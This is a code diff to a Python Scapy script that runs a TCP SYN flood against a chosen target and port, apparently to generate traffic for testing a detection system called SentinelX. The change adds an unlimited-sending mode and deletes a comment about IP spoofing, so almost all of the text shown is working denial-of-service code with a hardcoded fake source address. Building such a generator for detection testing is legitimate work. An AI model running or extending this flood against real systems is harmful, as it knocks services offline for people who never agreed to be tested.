@@ -13,16 +13,21 @@ parser.add_argument("--delay", type=float, default=0.005, help="Delay between pa
 args = parser.parse_args()
 
 print(f"[*] Starting TCP SYN Flood against {args.target}:{args.port}")
-print(f"[*] Sending {args.count} packets with {args.delay}s delay...")
+if args.count == 0:
+    print(f"[*] Sending packets indefinitely with {args.delay}s delay... (Press Ctrl+C to stop)")
+else:
+    print(f"[*] Sending {args.count} packets with {args.delay}s delay...")
 
 try:
-    # A real SYN flood spoofs IPs, but for SentinelX detection we just use our own IP or hardcode a fake one
     packet = IP(dst=args.target, src="10.0.0.99")/TCP(dport=args.port, flags="S")
-    for i in range(args.count):
+    sent = 0
+    while args.count == 0 or sent < args.count:
         send(packet, verbose=0)
-        time.sleep(args.delay)
-    print("\n[+] Attack simulation completed.")
+        sent += 1
+        if args.delay > 0:
+            time.sleep(args.delay)
+    print(f"\n[+] Attack simulation completed. Sent {sent} packets.")
 except KeyboardInterrupt:
-    print("\n[!] Attack aborted.")
+    print(f"\n[!] Attack aborted by user. Sent {sent} packets.")
 except Exception as e:
     print(f"\n[!] Error: {e}")
